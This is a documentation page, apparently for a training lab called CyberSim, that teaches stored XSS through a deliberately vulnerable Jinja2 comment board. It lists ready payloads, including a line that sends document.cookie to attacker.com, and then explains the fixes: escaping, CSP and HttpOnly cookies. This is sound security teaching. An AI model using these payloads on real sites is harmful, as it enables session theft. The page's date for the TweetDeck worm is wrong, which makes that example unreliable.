---
id: xss
title: Cross-Site Scripting (XSS)
sidebar_position: 2
---

# 📜 Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) occurs when an application includes unvalidated user input in the HTML it sends to a browser, allowing an attacker to execute arbitrary JavaScript in a victim's session.

---

## The Vulnerability

CyberSim's comment board stores user input and renders it using Jinja2's `| safe` filter — which explicitly **disables** HTML auto-escaping:

```python title="Jinja2 template — Vulnerable"
{# Renders raw HTML — scripts execute in the browser #}
{{ comment | safe }}
```

When a user posts `<script>alert('XSS!')</script>`, the browser receives:

```html
<div class="comment-text">
  <script>alert('XSS!')</script>   ← executes immediately
</div>
```

---

## Types of XSS

| Type | How it works | Example |
|---|---|---|
| **Stored (Persistent)** | Payload is saved to the database and served to every visitor | Comment boards, user profiles |
| **Reflected** | Payload is echoed back in the HTTP response | Search results, error messages |
| **DOM-Based** | Payload never hits the server — injected via client-side JS | `document.write(location.hash)` |

CyberSim demonstrates **Stored XSS** — comments are saved to the Flask session and rendered for every subsequent page load.

---

## Payloads to Try

Quick payload buttons in the challenge UI auto-fill the textarea. Click any to load it instantly.

### Basic alert

```html
<script>alert('XSS!')</script>
```

Proves script execution. The browser displays a JavaScript alert dialog.

---

### `onerror` attribute (script-tag filter bypass)

```html
<img src=x onerror=alert('XSS!')>
```

When the image fails to load (which it always will, since `src=x` doesn't exist), the `onerror` handler fires. Useful when `<script>` tags are filtered but HTML attributes are not.

---

### Cookie theft (most dangerous)

```html
<script>alert(document.cookie)</script>
```

In a real attack, this would be:

```html
<script>
  new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>
```

Session cookies contain the session token. Stealing them lets an attacker **hijack the user's session** without ever knowing their password.

---

### DOM manipulation

```html
<script>document.body.style.background='crimson'</script>
```

Demonstrates that an attacker has full control of the page's appearance and content.

---

## Side-by-Side Comparison

The challenge shows both rendering modes simultaneously:

| Panel | Rendering | Result |
|---|---|---|
| **Vulnerable** (left) | `\{{ comment \| safe }}` | Script **executes** |
| **Secure** (right) | `\{{ comment }}` | Script displayed as **plain text** |

This makes the difference immediately visible — the same payload that fires an alert on the left appears harmlessly as `<script>alert('XSS!')</script>` on the right.

---

## Scoring

| Achievement | Condition | Points |
|---|---|---|
| Script Kiddie | Basic `<script>` injection | +25 |
| Event Handler | `onerror` attribute exploit | +30 |
| Cookie Monster | `document.cookie` access | +40 |
| XSS Scholar | Read the defense guide | +15 |

Maximum: **100 pts** (capped)

---

## The Fix

### 1. Auto-escaping (simplest)

In Jinja2, never use `| safe` on user input. The default behavior auto-escapes:

```python title="Jinja2 — Secure (default)"
{# Auto-escapes <, >, &, ", ' #}
{{ comment }}
```

`<script>alert('XSS!')</script>` becomes:
```
&lt;script&gt;alert('XSS!')&lt;/script&gt;
```
…which the browser renders as text, not code.

---

### 2. Explicit escaping in Python

```python
import html
safe_comment = html.escape(user_input)
```

---

### 3. Content Security Policy (CSP)

A `Content-Security-Policy` HTTP header tells the browser what scripts it's allowed to run:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

This blocks all inline scripts — even if a payload somehow gets rendered, the browser refuses to execute it.

```python title="Flask — Add CSP header"
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

---

### Defense Summary

| Defense | Effectiveness |
|---|---|
| **HTML output encoding** | Stops all reflected and stored XSS |
| **Content Security Policy** | Defense-in-depth — blocks execution even if encoding fails |
| **Input validation** | Reduce attack surface — reject unexpected characters |
| **HttpOnly cookies** | Prevents `document.cookie` theft even if XSS fires |
| **SameSite cookies** | Limits CSRF abuse of stolen sessions |

---

## Real-World Impact

- **Twitter (2010) — TweetDeck worm** — self-retweeting XSS affected 500,000 accounts in hours
- **British Airways (2018)** — XSS used to inject a card skimmer, stealing 380,000 payment details
- **Samy Worm (MySpace, 2005)** — spread to 1 million profiles in under 20 hours

---

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
